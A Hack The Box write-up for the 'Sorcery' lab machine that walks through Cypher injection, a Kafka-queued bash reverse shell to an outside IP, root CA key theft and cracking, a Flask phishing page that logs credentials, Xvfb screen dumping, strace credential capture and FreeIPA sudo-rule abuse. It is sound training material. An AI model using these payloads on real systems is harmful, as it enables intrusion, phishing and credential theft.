---
{"-publish":true,"permalink":"/src/site/notes/hack-the-box/machines/insane/sorcery/","PassFrontmatter":true,"PassFrontmatter":true}
---




## Foothold
Accessing the webpage shows a reference to **git** subdomain.  
During enumeration of the Gitea instance, a public repository was found containing the code of the application, revealing several key insights into how to approach this scenario:

- In the issues section, there is a mention of a **vulnerability in the database queries**.
- The `docker-compose` file reveals the technologies used: **neo4j** container (database), **dns** container, **kafka** container (message broker), **ftp** container, **mail** container, and **mail_bot** container (with strings related to phishing).

An in-depth analysis shows how the database is structured, how the different models are defined, and how they're hydrated through the **model_derive** macro.

The **Product** model is particularly relevant as it is the only model users can interact with. In this file defining the model, we see a call to **derive**—this macro hydrates the different functions defined in **backend-macros**.

Looking at `product.rs`, we find the structure, argument names, and types:
```rust
// ./db/models/product.rs
#[derive(Model, Serialize, Deserialize)]
pub struct Product {
    pub id: String,
    pub name: String,
    pub description: String,
    pub is_authorized: bool,
    pub created_by_id: String,
}

// ./products/get_one.rs
#[get("/<id>")]
pub async fn get_one(guard: RequireClient, id: &str) -> Result<Json<Response>, AppError> {
    let product = match Product::get_by_id(id.to_owned()).await {
        Some(product) => product,
        None => return Err(AppError::NotFound),
    };
```
The **model_derive** macro injects several functions into the model:
```rust
// ./backend-macros/src/lib.rs
#[proc_macro_derive(Model, attributes(transient))]
pub fn model_derive(input: TokenStream) -> TokenStream {
    let ast = parse_macro_input!(input as DeriveInput);
    let ident = &ast.ident;
    let struct_name = ident.to_string();
// SNIP
 let get_functions = fields.iter().map(|&FieldWithAttributes { field, .. }| {
        let name = field.ident.as_ref().unwrap();
        let type_ = &field.ty;
        let name_string = name.to_string();
        let function_name = syn::Ident::new(
            &format!("get_by_{}", name_string),
            proc_macro2::Span::call_site(),
        );
        quote! {
            pub async fn #function_name(#name: #type_) -> Option<Self> {
                let graph = crate::db::connection::GRAPH.get().await;
                let query_string = format!(
                    r#"MATCH (result: {} {{ {}: "{}" }}) RETURN result"#,
                    #struct_name, #name_string, #name
                );
// SNIP
let save_function = quote! {
        pub async fn save(&self) -> &Self {
            #(#save_defs)*
            let graph = crate::db::connection::GRAPH.get().await;
            let mut tx = graph.start_txn().await.unwrap();
            let query_string = format!(
                "CREATE (result: {} {{ {} }})",
                #struct_name, #properties
            );
// SNIP
let get_all_function = quote! {
        pub async fn get_all() -> Vec<Self> {
            let graph = crate::db::connection::GRAPH.get().await;
            let query_string = format!(
                "MATCH (result: {}) RETURN result",
                #struct_name
            );
```

Let's inspect the `get_by_{}` function, which is the one we will use but the same concept applies to the rest.

- The variable **struct_name** contains the name of the model, in this case **Product**.
- The function `get_one` receives the **id** argument, which maps to **name_string**, then hydrates the function get_by_**id** invoked by GET requests to the `/<id>` endpoint.

Substituting variables, we get the following Cypher query:
```graphql
MATCH (result: Product {id: <id> })
```

Since the `id` is user-controlled, we can inject a payload here, hijacking the original query. Use [CyberChef](https://gchq.github.io/CyberChef/#recipe=Argon2(%7B'option':'UTF8','string':'somesalt'%7D,3,4096,1,32,'Argon2i','Encoded%20hash')&oenc=65001) to generate a password encrypted with Argon2.

To insert our payload, we must return the same number of arguments expected in the original query: five. Let’s build a query using `UNION` to update the admin user’s password. Take a look at [this blog](https://pentester.land/blog/cypher-injection-cheatsheet/) to understand how cypher injection works, it was written by the creator of the Cypher box released few months ago.

> Note: You can’t create another account with admin privileges since permissions reside in memory, not the database.

```
https://sorcery.htb/dashboard/store/" }) RETURN result UNION MATCH <update password query> RETURN {<an object with the same number of attributes as a Product>} AS result %2f%2f
```
> Last **%2f%2f** are slashes, url-encoded to comment the rest of the original query.

Executing this should show a product named "something" with the same description.

Now log in as admin. To access Debug/DNS sections, enroll a passkey—install Bitwarden in Firefox, create an account, and enroll. A Bitwarden prompt should appear to store the passkey.

Now we have access to three new sections: DNS, Debug, Blog

### DNS
We have the code in the gitea: every time the button `Force Records Re-fetch` is pressed, a message is queued in kafka, in the **update** topic. This message contains as value a path to a shell script that will be executed using bash:
```rust
    let topic = "update".to_string();
    let group = "update".to_string();

    let mut consumer = Consumer::from_hosts(vec![broker.clone()])
        .with_topic(topic)
        .with_group(group)
        .with_fallback_offset(FetchOffset::Earliest)
        .with_offset_storage(Some(GroupOffsetStorage::Kafka))
        .create()
        .expect("Kafka consumer");
// SNIP
        let Ok(message_sets) = consumer.poll() else {
            continue;
        };

        for message_set in message_sets.iter() {
            for message in message_set.messages() {
                let Ok(command) = str::from_utf8(message.value) else {
                    continue;
                };
// SNIP
let mut process = match Command::new("bash").arg("-c").arg(command).spawn() {
                    Ok(process) => process,
                    Err(error) => {
                        println!("[-] {error}");
                        continue;
                    }
                };
```
### Debug
Allows sending raw bytes to a host:port. 

By leveraging the debug tool, it's possible to queue a malicious message in the update topic to execute a **reverse shell**. Since the debug utility only accepts a hex-encoded payload, and Kafka requires messages to follow a specific format (including headers, padding, etc.), the easiest approach is to spawn a personal Kafka instance using Docker. You can then send a message to the **update** topic containing the payload, inspect the raw bytes using **Wireshark**, and finally send those bytes via the debug section.
```python
from kafka import KafkaProducer

producer = KafkaProducer(bootstrap_servers='localhost:9092')
producer.send('update', b'exec bash -i &>/dev/tcp/10.x.x.x/443 <&1')
producer.flush()
```
> In Wireshark, copy bytes from "Short Message Peer to Peer" and "[Malformed Packet: SMPP]".

### Blog
In this section, we can find two posts about phishing attacks targeting **tom_summers**, describing how he felt during the tests and listing some rules to avoid falling for such attacks again. The post mentioned three key elements: a subdomain under the `sorcery.htb` domain, an HTTPS server, and a certificate signed by the internal CA.

Let’s start by addressing the first requirement: the subdomain.

-   During enumeration of the container after obtaining a reverse shell, we found that the `dnsmasq` process is running under the context of the **user** account and is configured to read entries from two files: `/dns/hosts` (owned by root) and `/dns/hosts-user` (which does not exist).
    
-   First, we need to create the file `/dns/hosts-user` and write a rule that points a subdomain to our machine.
    
-   Since we control the `dnsmasq` process, we can kill and restart it, effectively applying our new DNS rules.
    
-   Finally, we can verify that the subdomain resolves to our host using:  
    `dig <subdomain>.sorcery.htb @127.0.0.1`
    
Now that the first requirement is met, we can move on to the remaining two: setting up an HTTPS server with a certificate signed by the root CA, which is "securely" stored on the FTP server.

While inspecting the docker compose configuration of the application, we discovered that the FTP service has anonymous login enabled. This allows us to connect without credentials and retrieve a copy of the root CA's `.crt` and `.key` files.
```
ftp anonymous@172.19.0.11
> cd pub
> mget *
```
> To access the FTP server, you should use a proxy tool. I recommend learning **ligolo-ng**, as it's one of the easiest to set up.

When attempting to generate a certificate, you'll be prompted for the root CA password. This can be brute-forced using a simple shell script or the [pemcrack](https://github.com/robertdaviraham/pemcrack) utility. Just clone the repository and compile it using **make**.

Once you’ve obtained the password, you can generate a signed certificate with the following commands:
```
❯ openssl genrsa -out server.key 2048
❯ openssl req -new -key server.key -out server.csr -subj "/C=US/ST=Something/L=Something/O=Something/CN=localhost"
❯ openssl x509 -req -in server.csr -CA RootCA.crt -CAkey RootCA.key -CAcreateserial -out server.crt -days 365 -sha256
```

Finally, you just need to send an email to the mail server targeting the user **tom_summers**:
```
swaks --to tom_summers@sorcery.htb --server 172.19.0.9:1025 --from me@sorcery.htb --header "Subject: review" --body "Hello world https://<subdomain>.sorcery.htb"
```
For the phishing page, you can either perform a MITM attack or simply serve a copy of a legitimate-looking website like Gitea. A quick and effective method is to right-click on the Gitea page, use "Save Page As…" to download it locally, and then serve it using flask:
```python
from flask import Flask, redirect, request, send_from_directory, url_for
app = Flask(__name__)
@app.route("/")
def serve_index():
    return send_from_directory(".", "index.html")
@app.route("/index_files/<path:filename>")
def serve_static_files(filename):
    return send_from_directory("index_files", filename)
@app.route("/user/login", methods=["POST"])
def login():
    user_name = request.form.get("user_name") or request.json.get("user_name")
    password = request.form.get("password") or request.json.get("password")
    app.logger.info(
        f"Received login: user_name={user_name}, password={password}"
    )
    return redirect(url_for("serve_index"))
if __name__ == "__main__":
    app.run(ssl_context=("server.crt", "server.key"), debug=True)
```
After sending the email, you can view the credentials of **tom_summers** in the flask app logs. Use these credentials to log in via ssh and claim your flag.

## Pivot
While enumerating processes, you can observe three running under the user **tom_summers_admin**:
```
/bin/sh -c /provision/cron/tom_summers_admin/text-editor.sh

/usr/bin/Xvfb :1 -fbdir /xorg/xvfb -screen 0 512x256x24 -nolisten local
```
Inspecting the `/xorg/xvfb` directory reveals the file **Xvfb_screen0**. This file contains a pixel-by-pixel representation of what **tom_summers_admin** is viewing. It's world-readable, meaning any user can dump and inspect its contents.

You can use the **ImageMagick** tool to extract and visualize the screen contents. To do this, download the AppImage version, upload it to the target, extract it, and dump the screen with the following commands:
```
./magick --appimage-extract

head -c $((512*256*4)) /xorg/xvfb/Xvfb_screen0 > screen.raw

./squashfs-root/usr/bin/magick -depth 8 -size 512x256 rgba:screen.raw output.png
```
> `512x256` is the screen resolution, and `4` refers to the RGBA channels.

By inspecting the resulting image (`output.png`), you can retrieve the credentials for **tom_summers_admin**.

This user is allowed to execute certain `sudo` commands as **rebecca_smith**:
```
docker login
strace -s 128 -p [0-9]*
```
-   The first command, `docker login`, attempts to authenticate to dockerhub using any cached credentials.
    
-   The second, `strace`, allows attaching to a running process to trace system calls.
> Note: The `[0-9]*` pattern here is a wildcard, **not** a regex. It means that the command accepts any extra argument that begins with a number—so options like `-f` (follow forks) are also allowed.

Because the credential read occurs very early during the execution of `docker login`, running `strace` manually after the command has started would miss it. To catch the full interaction, a script can be used to launch and trace the login process from the beginning.
```
#!/bin/bash
sudo -u rebecca_smith /usr/bin/docker login &
pid=""
while [ -z "$pid" ]; do
  pid=$(pgrep -u rebecca_smith -f "/usr/bin/docker login")
done
sudo -u rebecca_smith /usr/bin/strace -s 128 -p $pid -f -e trace=read
```
After obtaining the credentials for **rebecca_smith**, you can launch `pspy` to monitor scheduled tasks and analyze system activity. In the logs, you’ll notice a cron job running periodically to reset the credentials for the user **ash_winter**.

Using the binary **ksu.mit**, it's possible to switch to this account. You'll be prompted to reset the password, as the current one has expired.

## Privilege escalation

Once logged in as **ash_winter**, you’ll find in **sudo -l** that this user is allowed to restart the **sssd** service, which is related to Kerberos.

By inspecting the **/etc/hosts** file, you’ll find a DNS entry pointing to the domain controller. Accessing the corresponding URL in a browser leads to the FreeIPA login dashboard.

This identity management system also has a CLI counterpart called `ipa`, which allows you to manage the same directives available in the GUI.

For simplicity, I’ll use the command line to query information from the domain, and the GUI to make modifications.

Start by retrieving information about your account using the `user-show` command:
```bash
$ ipa user-show ash_winter --all 
```
The `ipa` command output mentions an indirect role gained through group membership. However, if you try to retrieve information about this role directly, you'll find nothing—it's most likely an orphaned reference left behind during group cleanup.
```bash
ash_winter@main:~$ ipa user-show ash_winter --all 
  dn: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
  User login: ash_winter
  First name: ash
  <SNIP>
  Indirect Member of role: <role>
```

```bash
ash_winter@main:~$ ipa role-show <role> --all 
ipa: ERROR: <role>: role not found
ash_winter@main:~$ ipa role-find --name=<role>
---------------
0 roles matched
---------------
----------------------------
Number of entries returned 0
```
Upon analyzing the group, we can see that members have permission to modify **sudo rules**.
```bash
ash_winter@main:~$ ipa group-show <group> --all
  dn: cn=<group>,cn=groups,cn=accounts,dc=sorcery,dc=htb
  Group name: <group>
  GID: 1638400005
  Indirect Member of role: manage_sudorules_ldap
  <SNIP>
```


We can abuse this permission to escalate privileges by granting ourselves the ability to execute any command via `sudo`.

1.  Go to the FreeIPA dashboard.
2.  Add the user **ash_winter** to the group that has permission to manage **sudo rules**.
3.  Navigate to the **sudo rules** section and add the rule **allow_sudo**, that grants full sudo access.    
4.  Restart the **sssd** service using `sudo systemctl restart sssd`.    
5.  Exit the `ksu.mit` session and reconnect as **ash_winter**.

Now, running `sudo -l` should display:
```bash
(ALL : ALL) ALL
```

Just **sudo su** and claim your flag.
